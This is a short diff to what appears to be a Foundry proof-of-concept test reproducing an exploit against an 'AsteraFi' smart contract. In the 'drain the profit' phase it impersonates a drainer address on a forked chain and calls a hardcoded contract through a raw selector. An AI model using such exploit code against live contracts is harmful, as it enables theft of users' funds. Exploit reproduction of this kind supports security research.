@@ -83,7 +83,7 @@ contract AsteraFiPoC is Test {
     // phase 3: drain the profit
     function testExploitPhase3() public {
         vm.rollFork(24321904 - 1);
-        vm.startPrank(drainer);
+        vm.startPrank(drainer, drainer);
         (0xcd69567080Dccad1Afe61aCc022c0A7164B29AB4).call(
             abi.encodeWithSelector(0x008ed35b, "")
         );
